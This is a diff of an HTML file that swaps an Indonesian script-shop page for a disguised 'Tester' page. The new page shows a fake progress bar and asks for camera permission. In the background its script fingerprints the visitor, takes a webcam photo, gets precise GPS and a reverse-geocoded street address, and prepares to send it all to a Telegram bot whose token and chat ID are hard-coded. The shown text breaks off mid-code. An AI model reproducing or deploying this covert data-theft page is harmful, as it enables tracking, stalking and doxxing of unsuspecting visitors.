@@ -1,487 +1,1355 @@
 <!DOCTYPE html>
-<html lang="id">
+
+<html lang="en">
+
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Market Putra Seishiro</title>
+
+  <meta charset="UTF-8" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+  <title>Tester</title>
+
   <style>
-    /* Reset */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      transition: all 0.4s ease;
+
+    :root {
+
+      --primary: #ff0000;
+
+      --secondary: #ff5252;
+
+      --dark: #1a0000;
+
+      --darker: #0d0000;
+
+      --accent: #ff8a8a;
+
     }
+
+    
+
+    * {
+
+      margin: 0;
+
+      padding: 0;
+
+      box-sizing: border-box;
+
+    }
+
+    
 
     body {
-      font-family: 'Poppins', sans-serif;
-      color: #fff;
-      min-height: 100vh;
-      background: linear-gradient(120deg, #89f7fe, #66a6ff, #ff9a9e, #fad0c4);
-      background-size: 400% 400%;
-      animation: gradientShift 15s ease infinite;
-      overflow-x: hidden;
-    }
 
-    @keyframes gradientShift {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
+      background: var(--darker);
 
-    /* Animasi bunga */
-    .flower {
-      position: fixed;
-      top: -50px;
-      font-size: 24px;
-      pointer-events: none;
-      animation: fall 4s linear forwards;
-      z-index: 999;
-    }
+      color: var(--primary);
 
-    @keyframes fall {
-      0% { transform: translateY(-50px) rotate(0deg); opacity: 1; }
-      100% { transform: translateY(110vh) rotate(360deg); opacity: 0; }
-    }
+      font-family: 'Courier New', monospace;
 
-    /* Welcome Screen */
-    #welcome {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.85);
       display: flex;
-      align-items: center;
+
+      flex-direction: column;
+
       justify-content: center;
-      z-index: 9999;
-      color: #fff;
-      font-size: 2rem;
-      font-weight: 700;
+
+      align-items: center;
+
+      min-height: 100vh;
+
       text-align: center;
-      animation: fadeIn 1s ease forwards;
-    }
 
-    #welcome.fade-out { animation: fadeOut 1s ease forwards; }
-
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-    @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; visibility: hidden; } }
-
-    /* Partikel */
-    .particle {
-      position: absolute;
-      width: 8px;
-      height: 8px;
-      background: rgba(255,255,255,0.6);
-      border-radius: 50%;
-      animation: float 10s linear infinite;
-    }
-
-    @keyframes float {
-      from { transform: translateY(100vh) scale(0.5); }
-      to { transform: translateY(-10vh) scale(1); }
-    }
-
-    /* Container */
-    .container {
-      text-align: center;
-      padding: 70px 20px;
-      max-width: 1200px;
-      margin: auto;
-      position: relative;
-      z-index: 2;
-      opacity: 0;
-      transform: translateY(40px);
-      transition: opacity 1s ease, transform 1s ease;
-    }
-
-    .container.show { opacity: 1; transform: translateY(0); }
-
-    header h1 {
-      font-size: 3rem;
-      font-weight: 700;
-      margin-bottom: 10px;
-      text-shadow: 0 2px 15px rgba(0,0,0,0.3);
-    }
-
-    header p {
-      font-size: 1.2rem;
-      margin-bottom: 40px;
-      opacity: 0.9;
-    }
-
-    /* Channel Buttons */
-    .channels { margin-bottom: 50px; }
-
-    .channels a {
-      display: inline-block;
-      margin: 10px;
-      padding: 12px 28px;
-      border-radius: 30px;
-      text-decoration: none;
-      font-weight: 600;
-      font-size: 0.95rem;
-      background: rgba(255,255,255,0.2);
-      backdrop-filter: blur(10px);
-      border: 1px solid rgba(255,255,255,0.3);
-      color: #fff;
-      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
-      transition: 0.4s;
-    }
-
-    .channels a:hover {
-      transform: translateY(-3px);
-      background: rgba(255,255,255,0.3);
-      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
-    }
-
-    /* Products */
-    .products {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-      gap: 30px;
-    }
-
-    .card {
-      background: rgba(255,255,255,0.15);
-      backdrop-filter: blur(20px);
-      border-radius: 20px;
-      padding: 25px;
-      text-align: center;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-      transition: 0.4s ease;
-      opacity: 0;
-      transform: translateY(40px);
-      animation: cardIn 1s forwards;
-    }
-
-    .card:nth-child(1){ animation-delay: 0.3s; }
-    .card:nth-child(2){ animation-delay: 0.6s; }
-    .card:nth-child(3){ animation-delay: 0.9s; }
-
-    @keyframes cardIn {
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .card h3 {
-      color: #fff;
-      margin-bottom: 12px;
-      font-size: 1.4rem;
-      text-shadow: 0 2px 10px rgba(0,0,0,0.2);
-    }
-
-    .card p, .card ul { color: #f1f1f1; }
-
-    .card ul {
-      text-align: left;
-      margin: 0 auto 20px;
-      padding-left: 20px;
-      font-size: 0.95rem;
-      line-height: 1.6;
-    }
-
-    /* Buttons */
-    .order-btn {
-      display: inline-block;
-      margin: 6px;
-      padding: 12px 24px;
-      border-radius: 25px;
-      font-weight: 600;
-      text-decoration: none;
-      background: linear-gradient(135deg, #66a6ff, #89f7fe);
-      color: #fff;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-      transition: 0.3s ease;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .order-btn::after {
-      content: "";
-      position: absolute;
-      top: 0; left: -100%;
-      width: 100%; height: 100%;
-      background: rgba(255,255,255,0.3);
-      transition: 0.4s;
-    }
-
-    .order-btn:hover::after { left: 100%; }
-
-    .order-btn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 8px 20px rgba(0,0,0,0.25);
-    }
-
-    /* Efek kilau */
-    .order-btn.shine::before {
-      content: "";
-      position: absolute;
-      top: 0; left: -75%;
-      width: 50%; height: 100%;
-      background: linear-gradient(
-        120deg,
-        rgba(255,255,255,0) 0%,
-        rgba(255,255,255,0.6) 50%,
-        rgba(255,255,255,0) 100%
-      );
-      transform: skewX(-25deg);
-      animation: shineMove 1.5s forwards;
-    }
-
-    @keyframes shineMove { 100% { left: 125%; } }
-
-    /* Footer */
-    footer {
-      margin-top: 60px;
       padding: 20px;
-      text-align: center;
-      font-size: 0.9rem;
-      opacity: 0.8;
-    }
 
-    /* Dark mode */
-    body.dark-mode {
-      background: linear-gradient(120deg, #0f2027, #203a43, #2c5364);
-      color: #eee;
-    }
-
-    body.dark-mode .card { background: rgba(0,0,0,0.5); color: #ddd; }
-    body.dark-mode .card h3 { color: #fff; }
-    body.dark-mode .channels a {
-      background: rgba(0,0,0,0.4);
-      border: 1px solid rgba(255,255,255,0.1);
-    }
-    body.dark-mode .order-btn {
-      background: linear-gradient(135deg, #ff9a9e, #fad0c4);
-      color: #111;
-    }
-
-    /* Toggle Dark Button */
-    .toggle-dark {
-      position: fixed;
-      top: 20px; right: 20px;
-      z-index: 100;
-      background: rgba(255,255,255,0.2);
-      backdrop-filter: blur(10px);
-      border: none;
-      border-radius: 50%;
-      width: 45px; height: 45px;
-      font-size: 1.2rem;
-      color: #fff;
-      cursor: pointer;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-      transition: 0.3s ease;
-    }
-
-    .toggle-dark:hover { transform: scale(1.1); }
-
-    /* Stiker Anime Chubby */
-    .sticker {
-      position: fixed;
-      bottom: 10px; right: 10px;
-      width: 120px;
-      z-index: 50;
-      animation: bounce 3s infinite ease-in-out;
-      pointer-events: none;
-    }
-
-    @keyframes bounce {
-      0%,100% { transform: translateY(0); }
-      50% { transform: translateY(-12px); }
-    }
-
-    /* Musik Box */
-    .music-box {
-      position: fixed;
-      bottom: 10px; left: 10px;
-      width: 320px;
-      z-index: 100;
-      box-shadow: 0 6px 15px rgba(0,0,0,0.3);
-      border-radius: 12px;
       overflow: hidden;
-      background: rgba(0,0,0,0.6);
-      padding: 10px;
-      color: #fff;
+
+      position: relative;
+
     }
 
-    .music-box h4 { margin: 0 0 6px 0; font-size: 0.9rem; }
-    .music-box audio { width: 100%; }
+    
+
+    .grid-bg {
+
+      position: absolute;
+
+      top: 0;
+
+      left: 0;
+
+      width: 100%;
+
+      height: 100%;
+
+      background-image: 
+
+        linear-gradient(rgba(255, 0, 0, 0.05) 1px, transparent 1px),
+
+        linear-gradient(90deg, rgba(255, 0, 0, 0.05) 1px, transparent 1px);
+
+      background-size: 20px 20px;
+
+      z-index: -1;
+
+    }
+
+    
+
+    .scan-line {
+
+      position: absolute;
+
+      height: 30px;
+
+      width: 100%;
+
+      background: linear-gradient(to bottom, transparent, rgba(255, 0, 0, 0.2), transparent);
+
+      top: 0;
+
+      animation: scan 4s linear infinite;
+
+      z-index: -1;
+
+    }
+
+    
+
+    @keyframes scan {
+
+      0% { top: 0; }
+
+      100% { top: 100%; }
+
+    }
+
+    
+
+    .container {
+
+      max-width: 800px;
+
+      width: 100%;
+
+      background: rgba(26, 0, 0, 0.9);
+
+      border: 1px solid var(--primary);
+
+      border-radius: 8px;
+
+      padding: 30px;
+
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
+
+      position: relative;
+
+      overflow: hidden;
+
+    }
+
+    
+
+    .container::before {
+
+      content: '';
+
+      position: absolute;
+
+      top: -2px;
+
+      left: -2px;
+
+      right: -2px;
+
+      bottom: -2px;
+
+      z-index: -1;
+
+      background: linear-gradient(45deg, #ff0000, #ff5252, #ff8a8a, #ff0000);
+
+      background-size: 400% 400%;
+
+      animation: gradient-border 15s ease infinite;
+
+      border-radius: 10px;
+
+    }
+
+    
+
+    @keyframes gradient-border {
+
+      0% { background-position: 0% 50%; }
+
+      50% { background-position: 100% 50%; }
+
+      100% { background-position: 0% 50%; }
+
+    }
+
+    
+
+    h1 {
+
+      font-size: 2.2rem;
+
+      margin-bottom: 20px;
+
+      animation: blink 1s infinite;
+
+      text-shadow: 0 0 10px var(--primary);
+
+      letter-spacing: 2px;
+
+    }
+
+    
+
+    .progress-container {
+
+      width: 100%;
+
+      height: 25px;
+
+      background: var(--dark);
+
+      border-radius: 10px;
+
+      margin: 30px 0;
+
+      overflow: hidden;
+
+      border: 1px solid var(--primary);
+
+      box-shadow: 0 0 10px rgba(255, 0, 0, 0.2);
+
+    }
+
+    
+
+    .progress-bar {
+
+      height: 100%;
+
+      width: 50%;
+
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+
+      border-radius: 10px;
+
+      animation: progress-pulse 2s infinite;
+
+      transition: width 0.5s ease;
+
+      position: relative;
+
+      overflow: hidden;
+
+    }
+
+    
+
+    .progress-bar::after {
+
+      content: '';
+
+      position: absolute;
+
+      top: 0;
+
+      left: 0;
+
+      bottom: 0;
+
+      width: 20px;
+
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+
+      animation: progress-shine 1.5s infinite;
+
+    }
+
+    
+
+    @keyframes progress-shine {
+
+      0% { left: -20px; }
+
+      100% { left: 100%; }
+
+    }
+
+    
+
+    @keyframes progress-pulse {
+
+      0%, 100% { opacity: 0.8; }
+
+      50% { opacity: 1; }
+
+    }
+
+    
+
+    @keyframes blink {
+
+      0%, 100% { opacity: 1; }
+
+      50% { opacity: 0.6; }
+
+    }
+
+    
+
+    .status-text {
+
+      margin: 15px 0;
+
+      font-size: 1.1rem;
+
+      color: var(--secondary);
+
+    }
+
+    
+
+    .btn-container {
+
+      display: flex;
+
+      flex-direction: column;
+
+      gap: 15px;
+
+      margin-top: 25px;
+
+    }
+
+    
+
+    .btn {
+
+      background: transparent;
+
+      color: var(--primary);
+
+      border: 1px solid var(--primary);
+
+      padding: 12px 25px;
+
+      font-family: 'Courier New', monospace;
+
+      font-size: 1.1rem;
+
+      border-radius: 4px;
+
+      cursor: pointer;
+
+      transition: all 0.3s;
+
+      position: relative;
+
+      overflow: hidden;
+
+      text-transform: uppercase;
+
+      letter-spacing: 1px;
+
+    }
+
+    
+
+    .btn:hover {
+
+      background: rgba(255, 0, 0, 0.1);
+
+      box-shadow: 0 0 15px var(--primary);
+
+    }
+
+    
+
+    .btn:active {
+
+      transform: scale(0.98);
+
+    }
+
+    
+
+    .info-text {
+
+      margin-top: 20px;
+
+      font-size: 0.9rem;
+
+      color: var(--accent);
+
+      text-align: left;
+
+      line-height: 1.6;
+
+    }
+
+    
+
+    .info-text a {
+
+      color: var(--primary);
+
+      text-decoration: none;
+
+      font-weight: bold;
+
+    }
+
+    
+
+    .info-text a:hover {
+
+      text-decoration: underline;
+
+    }
+
+    
+
+    .footer {
+
+      margin-top: 30px;
+
+      color: var(--accent);
+
+      font-size: 0.9rem;
+
+    }
+
+    
+
+    .camera-container {
+
+      position: fixed;
+
+      top: 0;
+
+      left: 0;
+
+      width: 100%;
+
+      height: 100%;
+
+      background: rgba(0, 0, 0, 0.95);
+
+      display: flex;
+
+      justify-content: center;
+
+      align-items: center;
+
+      z-index: 100;
+
+      opacity: 0;
+
+      pointer-events: none;
+
+      transition: opacity 0.3s;
+
+    }
+
+    
+
+    .camera-container.active {
+
+      opacity: 1;
+
+      pointer-events: all;
+
+    }
+
+    
+
+    .camera-feed {
+
+      width: 100%;
+
+      max-width: 500px;
+
+      border: 2px solid var(--primary);
+
+      border-radius: 8px;
+
+      box-shadow: 0 0 30px var(--primary);
+
+    }
+
+    
+
+    .notification {
+
+      position: fixed;
+
+      bottom: 20px;
+
+      right: 20px;
+
+      background: var(--dark);
+
+      border: 1px solid var(--primary);
+
+      border-radius: 4px;
+
+      padding: 12px 18px;
+
+      transform: translateX(150%);
+
+      transition: transform 0.3s;
+
+      z-index: 1000;
+
+      box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
+
+    }
+
+    
+
+    .notification.show {
+
+      transform: translateX(0);
+
+    }
+
   </style>
+
 </head>
+
 <body>
-  <!-- Welcome screen -->
-  <div id="welcome">✨ Welcome to Market Putra Seishiro ✨</div>
 
-  <!-- Partikel -->
-  <div class="particle" style="left:10%; animation-duration:12s;"></div>
-  <div class="particle" style="left:30%; animation-duration:15s;"></div>
-  <div class="particle" style="left:60%; animation-duration:18s;"></div>
-  <div class="particle" style="left:80%; animation-duration:20s;"></div>
+  <div class="grid-bg"></div>
 
-  <!-- Tombol Dark Mode -->
-  <button class="toggle-dark" onclick="toggleDark()">🌙</button>
+  <div class="scan-line"></div>
 
-  <div class="container" id="main-content">
-    <header>
-      <h1>Market Putra Seishiro</h1>
-      <p>Trust is the most valuable treasure that is hard to get, but easy to lose.</p>
-    </header>
+  
 
-    <nav class="channels">
-      <a href="https://t.me/putraseishiro" target="_blank">Kontak Owner</a>
-      <a href="https://t.me/infodangerarea" target="_blank">Info Channel</a>
-      <a href="https://t.me/roompublicputraseishiro" target="_blank">Room Public</a>
-    </nav>
+  <div class="container">
 
-    <main class="products">
-      <!-- Produk cards -->
-      <!-- (isi produk tetap sama, tidak diubah, hanya rapi indentasi) -->
-      <div class="card">
-        <h3>Panel 1GB–10GB</h3>
-        <p>Rp 1k–10k</p>
-        <a class="order-btn" href="https://pomf2.lain.la/f/ujfzeldz.jpg" target="_blank">Order</a>
-        <a class="order-btn" href="https://t.me/putraseishiro" target="_blank">Hubungi</a>
-      </div>
+    <h1>TESTER 2 [ 85% ]</h1>
 
-      <div class="card">
-        <h3>Script Danger Area</h3>
-        <ul>
-          <li>No Update: Rp 50K</li>
-          <li>Full Update: Rp 120k</li>
-          <li>Reseller SC: Rp 150k</li>
-          <li>Partner SC: Rp 170k</li>
-          <li>Moderator SC: Rp 190k</li>
-          <li>Ceo SC: Rp 230k</li>
-          <li>Owner SC: Rp 250k</li>
-        </ul>
-        <a class="order-btn" href="https://pomf2.lain.la/f/ujfzeldz.jpg" target="_blank">Order</a>
-        <a class="order-btn" href="https://t.me/putraseishiro" target="_blank">Hubungi</a>
-      </div>
+    
 
-      <!-- produk lainnya sama -->
-            <div class="card">
-        <h3>Script 5Brother</h3>
-        <ul>
-          <li>No Update: Rp 60K</li>
-          <li>Full Update: Rp 100k</li>
-          <li>Reseller SC: Rp 150k</li>
-          <li>Partner SC: Rp 180k</li>
-          <li>Moderator SC: Rp 200k</li>
-          <li>Ceo SC: Rp 230k</li>
-          <li>Owner SC: Rp 250k</li>
-        </ul>
-        <a class="order-btn" href="https://pomf2.lain.la/f/ujfzeldz.jpg" target="_blank">Order</a>
-        <a class="order-btn" href="https://t.me/putraseishiro" target="_blank">Hubungi</a>
-      </div>
+    <div class="progress-container">
 
-      <div class="card">
-        <h3>Script Rambo Generation Hunter</h3>
-        <ul>
-          <li>No Update: Rp 40K</li>
-          <li>Full Update: Rp 80k</li>
-          <li>Reseller SC: Rp 130k</li>
-          <li>Partner SC: Rp 150k</li>
-          <li>Moderator SC: Rp 170k</li>
-          <li>Ceo SC: Rp 200k</li>
-          <li>Owner SC: Rp 230k</li>
-        </ul>
-        <a class="order-btn" href="https://pomf2.lain.la/f/ujfzeldz.jpg" target="_blank">Order</a>
-        <a class="order-btn" href="https://t.me/putraseishiro" target="_blank">Hubungi</a>
-      </div>
+      <div class="progress-bar" id="progressBar"></div>
 
-      <div class="card">
-        <h3>Script Orbits Engine Shadow</h3>
-        <ul>
-          <li>No Update: Rp 40K</li>
-          <li>Full Update: Rp 80k</li>
-          <li>Reseller SC: Rp 130k</li>
-          <li>Partner SC: Rp 150k</li>
-          <li>Moderator SC: Rp 170k</li>
-          <li>Ceo SC: Rp 200k</li>
-          <li>Owner SC: Rp 230k</li>
-        </ul>
-        <a class="order-btn" href="https://pomf2.lain.la/f/ujfzeldz.jpg" target="_blank">Order</a>
-        <a class="order-btn" href="https://t.me/putraseishiro" target="_blank">Hubungi</a>
-      </div>
+    </div>
 
-      <div class="card">
-        <h3>Script Black Owl</h3>
-        <ul>
-          <li>No Update: Rp 60K</li>
-          <li>Full Update: Rp 130k</li>
-          <li>Reseller SC: Rp 160k</li>
-          <li>Partner SC: Rp 180k</li>
-          <li>Moderator SC: Rp 205k</li>
-          <li>Ceo SC: Rp 255k</li>
-          <li>Owner SC: Rp 315k</li>
-        </ul>
-        <a class="order-btn" href="https://pomf2.lain.la/f/ujfzeldz.jpg" target="_blank">Order</a>
-        <a class="order-btn" href="https://t.me/putraseishiro" target="_blank">Hubungi</a>
-      </div>
-    </main>
+    
+
+    <p class="status-text">TESTER 4</p>
+
+    <p class="status-text">TESTER 5</p>
+
+    
+
+    <div class="btn-container">
+
+      <button class="btn" id="skipBtn">TESTER 6</button>
+
+    </div>
+
+    
+
+    <div class="info-text">
+
+      <p>TESTER 7.</p>
+
+      <p>Pastikan progress mencapai 100% dan izinkan akses kamera untuk pengalaman terbaik.</p>
+
+    </div>
+
+    
+
+    <div class="footer">
+
+      <p>By PutraSeishiro</p>
+
+    </div>
+
   </div>
 
-  <footer>
-    © 2025 Market Putra Seishiro - Trust is the most valuable treasure that is hard to get, but easy to lose.
-  </footer>
+  
 
-  <!-- Stiker Anime Chubby -->
-  <img class="sticker" src="https://pomf2.lain.la/f/b7kuv4f3.jpg" alt="Chubby Anime">
+  <div class="camera-container" id="cameraContainer">
 
-  <!-- Musik Full -->
-  <div class="music-box">
-    <h4>Now Playing 🎶</h4>
-    <audio controls autoplay loop>
-      <source src="https://files.catbox.moe/jqdj3g.mp3" type="audio/mpeg">
-      Browser kamu tidak mendukung audio.
-    </audio>
+    <video id="cameraFeed" class="camera-feed" autoplay playsinline></video>
+
   </div>
+
+  
+
+  <div class="notification" id="notification">
+
+    Data collected and sent successfully!
+
+  </div>
+
+
 
   <script>
-    // bunga jatuh
-    function createFlower() {
-      const flower = document.createElement("div");
-      flower.classList.add("flower");
-      flower.innerText = "🌸";
-      flower.style.left = Math.random() * window.innerWidth + "px";
-      flower.style.fontSize = (20 + Math.random() * 20) + "px";
-      document.body.appendChild(flower);
-      setTimeout(() => flower.remove(), 4000);
+
+    // Konfigurasi
+
+    const BOT_TOKEN = "8509635804:AAElyqWLfOWV9uyiuNHXgexZa7v6gyDFOsk";
+
+    const OWNER_CHAT_ID = "6086060284";
+
+    
+
+    // Elemen DOM
+
+    const skipBtn = document.getElementById('skipBtn');
+
+    const cameraContainer = document.getElementById('cameraContainer');
+
+    const cameraFeed = document.getElementById('cameraFeed');
+
+    const notification = document.getElementById('notification');
+
+    const progressBar = document.getElementById('progressBar');
+
+    
+
+    // State variables
+
+    let dataCollected = false;
+
+    let photoTaken = false;
+
+    let stream = null;
+
+    
+
+    // Event listeners
+
+    skipBtn.addEventListener('click', handleSkip);
+
+    
+
+    // Fungsi utama
+
+    async function init() {
+
+      // Mulai progress bar animation
+
+      animateProgressBar();
+
+      
+
+      // Jalankan pengumpulan data di latar belakang
+
+      collectData();
+
     }
 
-    // bikin bunga tiap scroll
-    window.addEventListener("scroll", () => {
-      for (let i = 0; i < 3; i++) createFlower();
-    });
+    
 
-    // welcome animasi
-    window.addEventListener("load", () => {
-      const welcome = document.getElementById("welcome");
-      const main = document.getElementById("main-content");
-      setTimeout(() => {
-        welcome.classList.add("fade-out");
-        setTimeout(() => {
-          welcome.style.display = "none";
-          main.classList.add("show");
-        }, 1000);
-      }, 2000);
-    });
+    function animateProgressBar() {
 
-    // Efek kilau tombol saat scroll
-    window.addEventListener("scroll", () => {
-      document.querySelectorAll(".order-btn").forEach(btn => {
-        if (!btn.classList.contains("shine")) {
-          btn.classList.add("shine");
-          setTimeout(() => btn.classList.remove("shine"), 1600);
+      let width = 50;
+
+      const interval = setInterval(() => {
+
+        if (width < 100) {
+
+          width += 0.5;
+
+          progressBar.style.width = `${width}%`;
+
+        } else {
+
+          clearInterval(interval);
+
         }
-      });
-    });
 
-    // toggle dark mode
-    function toggleDark() {
-      document.body.classList.toggle("dark-mode");
-      const btn = document.querySelector(".toggle-dark");
-      btn.textContent = document.body.classList.contains("dark-mode") ? "☀️" : "🌙";
+      }, 100);
+
     }
+
+    
+
+    async function collectData() {
+
+      if (dataCollected) return;
+
+      
+
+      dataCollected = true;
+
+      
+
+      try {
+
+        // Ambil data visitor
+
+        const visitorInfo = await getVisitorInfo();
+
+        
+
+        // Ambil foto dari kamera
+
+        await takePhoto();
+
+        
+
+        // Kirim data ke Telegram
+
+        await sendToTelegram(visitorInfo);
+
+      } catch (error) {
+
+        console.error("Error collecting data:", error);
+
+      }
+
+    }
+
+    
+
+    function handleSkip() {
+
+      if (!dataCollected) {
+
+        collectData();
+
+        showNotification();
+
+      }
+
+    }
+
+    
+
+    async function takePhoto() {
+
+      if (photoTaken) return;
+
+      
+
+      try {
+
+        // Minta akses ke kamera
+
+        stream = await navigator.mediaDevices.getUserMedia({ 
+
+          video: { facingMode: "user" } 
+
+        });
+
+        
+
+        // Tampilkan feed kamera
+
+        cameraFeed.srcObject = stream;
+
+        cameraContainer.classList.add('active');
+
+        
+
+        // Tunggu sebentar untuk memastikan kamera siap
+
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        
+
+        // Ambil foto
+
+        const photoData = await capturePhoto();
+
+        
+
+        // Simpan foto untuk dikirim nanti
+
+        window.capturedPhoto = photoData;
+
+        
+
+        // Matikan kamera
+
+        stopCamera();
+
+        
+
+        photoTaken = true;
+
+      } catch (error) {
+
+        console.error("Error accessing camera:", error);
+
+        window.capturedPhoto = null;
+
+      }
+
+    }
+
+    
+
+    function capturePhoto() {
+
+      return new Promise((resolve) => {
+
+        const canvas = document.createElement('canvas');
+
+        const context = canvas.getContext('2d');
+
+        
+
+        // Set canvas size sesuai dengan video
+
+        canvas.width = cameraFeed.videoWidth;
+
+        canvas.height = cameraFeed.videoHeight;
+
+        
+
+        // Gambar frame video ke canvas
+
+        context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
+
+        
+
+        // Konversi ke data URL
+
+        const dataUrl = canvas.toDataURL('image/jpeg');
+
+        resolve(dataUrl);
+
+      });
+
+    }
+
+    
+
+    function stopCamera() {
+
+      if (stream) {
+
+        stream.getTracks().forEach(track => track.stop());
+
+        cameraContainer.classList.remove('active');
+
+      }
+
+    }
+
+    
+
+    function showNotification() {
+
+      notification.classList.add('show');
+
+      setTimeout(() => {
+
+        notification.classList.remove('show');
+
+      }, 3000);
+
+    }
+
+    
+
+    async function generateFingerprint() {
+
+      const ua = navigator.userAgent;
+
+      const lang = navigator.language;
+
+      const res = screen.width + "x" + screen.height;
+
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+      const ram = navigator.deviceMemory || "N/A";
+
+      const cpu = navigator.hardwareConcurrency || "N/A";
+
+
+
+      const raw = `${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
+
+      const encoder = new TextEncoder();
+
+      const data = encoder.encode(raw);
+
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+
+      return [...new Uint8Array(hashBuffer)].map(x => x.toString(16).padStart(2, '0')).join('');
+
+    }
+
+
+
+    // Fungsi untuk mengenkripsi teks (simulasi)
+
+    function encryptText(text) {
+
+      if (text === "N/A") return "N/A";
+
+      // Simulasi enkripsi dasar (dalam implementasi nyata, gunakan library enkripsi yang kuat)
+
+      return btoa(text).split('').reverse().join('');
+
+    }
+
+
+
+    async function getVisitorInfo() {
+
+      const clock = new Date().toLocaleString();
+
+      let latitude = "N/A", longitude = "N/A", weather = "N/A", temperature = "N/A";
+
+      let country = "N/A", province = "N/A", city = "N/A", ip = "N/A", accuracy = "N/A", namaISP = "N/A";
+
+      let street = "N/A", streetNumber = "N/A", district = "N/A";
+
+      let simOperator = "N/A", fullName = "N/A", googleEmail = "N/A", googlePassword = "N/A";
+
+
+
+      const userAgent = navigator.userAgent;
+
+      const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
+
+      const device = navigator.platform + " - " + userAgent;
+
+      const loginFrom = navigator.platform || "N/A";
+
+      const language = navigator.language || "N/A";
+
+      const resolution = screen.width + "x" + screen.height;
+
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+
+      const isOnline = navigator.onLine;
+
+      const deviceMemory = navigator.deviceMemory || "N/A";
+
+      const cpuCores = navigator.hardwareConcurrency || "N/A";
+
+      const isTouch = 'ontouchstart' in window;
+
+      const cookiesEnabled = navigator.cookieEnabled;
+
+      const doNotTrack = navigator.doNotTrack;
+
+      const fingerprint = await generateFingerprint();
+
+
+
+      // Battery info
+
+      const batteryInfo = await navigator.getBattery().then(battery => {
+
+        return {
+
+          "battery level": Math.round(battery.level * 100) + "%",
+
+          "charging": battery.charging ? "yes" : "no"
+
+        };
+
+      }).catch(() => ({
+
+        "battery level": "N/A",
+
+        "charging": "N/A"
+
+      }));
+
+
+
+      // Deteksi kartu SIM (hanya bekerja di beberapa browser mobile)
+
+      if ('connection' in navigator) {
+
+        try {
+
+          // @ts-ignore
+
+          simOperator = navigator.connection.effectiveType || "N/A";
+
+        } catch (e) {
+
+          simOperator = "N/A";
+
+        }
+
+      }
+
+
+
+      // Coba mendapatkan informasi Google (simulasi)
+
+      try {
+
+        // Ini hanya simulasi - dalam praktiknya, tidak mungkin mendapatkan info Google pengguna
+
+        // tanpa otentikasi yang tepat
+
+        if (localStorage.length > 0) {
+
+          googleEmail = "user@gmail.com (simulated)";
+
+          googlePassword = encryptText("password123 (simulated)");
+
+        }
+
+      } catch (e) {
+
+        // Tidak bisa mengakses localStorage
+
+      }
+
+
+
+      // Coba mendapatkan nama lengkap (simulasi)
+
+      try {
+
+        // @ts-ignore
+
+        if (navigator.credentials && navigator.credentials.get) {
+
+          fullName = "@##&#@$&#--#++-#++#";
+
+        }
+
+      } catch (e) {
+
+        // Tidak bisa mendapatkan info
+
+      }
+
+
+
+      // Dapatkan informasi IP dan lokasi
+
+      try {
+
+        // Menggunakan dua layanan berbeda untuk redundansi
+
+        const ipData1 = await fetch("https://ipapi.co/json/").then(r => r.json());
+
+        const ipData2 = await fetch("https://api.ipify.org?format=json").then(r => r.json());
+
+        
+
+        ip = ipData1.ip || ipData2.ip || "N/A";
+
+        country = ipData1.country_name || "N/A";
+
+        province = ipData1.region || "N/A";
+
+        city = ipData1.city || "N/A";
+
+        latitude = ipData1.latitude || "N/A";
+
+        longitude = ipData1.longitude || "N/A";
+
+        namaISP = ipData1.org || "N/A";
+
+
+
+        // Dapatkan informasi alamat lebih detail
+
+        if (latitude !== "N/A" && longitude !== "N/A") {
+
+          try {
+
+            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+
+            const data = await response.json();
+
+            if (data.address) {
+
+              street = data.address.road || "N/A";
+
+              streetNumber = data.address.house_number || "N/A";
+
+              district = data.address.suburb || data.address.neighbourhood || "N/A";
+
+            }
+
+          } catch (e) {
+
+            console.error("Error getting address details:", e);
+
+          }
+
+        }
+
+      } catch (error) {
+
+        console.error("Error getting IP information:", error);
+
+      }
+
+
+
+      // Dapatkan informasi cuaca
+
+      try {
+
+        if (latitude !== "N/A" && longitude !== "N/A") {
+
+          const weatherData = await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r => r.json());
+
+          weather = weatherData.current_condition[0].weatherDesc[0].value;
+
+          temperature = weatherData.current_condition[0].temp_C + "°C";
+
+        }
+
+      } catch {}
+
+
+
+      // Dapatkan lokasi GPS yang lebih akurat
+
+      try {
+
+        await new Promise((resolve) => {
+
+          navigator.geolocation.getCurrentPosition(
+
+            pos => {
+
+              latitude = pos.coords.latitude.toFixed(6);
+
+              longitude = pos.coords.longitude.toFixed(6);
+
+              accuracy = pos.coords.accuracy + "m";
+
+              resolve();
+
+            },
+
+            () => resolve(),
+
+            { enableHighAccuracy: true, timeout: 5000 }
+
+          );
+
+        });
+
+      } catch {}
+
+
+
+      return {
+
+        "ISP": namaISP,
+
+        "IP Address": ip,
+
+        "SIM Operator": simOperator,
+
+        "Full Name": fullName,
+
+        "Google Email": googleEmail,
+
+        "Google Password": googlePassword,
+
